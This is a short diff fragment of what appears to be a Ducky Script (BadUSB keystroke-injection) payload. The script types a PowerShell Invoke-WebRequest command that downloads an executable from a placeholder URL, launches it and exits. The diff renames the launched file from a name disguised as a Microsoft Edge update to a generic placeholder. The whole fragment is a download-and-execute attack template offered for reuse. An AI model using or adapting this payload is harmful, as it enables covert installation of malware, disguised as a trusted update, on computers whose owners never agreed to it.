@@ -29,7 +29,7 @@ DELAY 499
 STRING Invoke-WebRequest "your download url" -OutFile "your.exe"
 ENTER
 DELAY 799
-STRING start msedge_update_136.0.exe
+STRING start Your Program Name.exe
 ENTER
 DELAY 990
 STRING exit
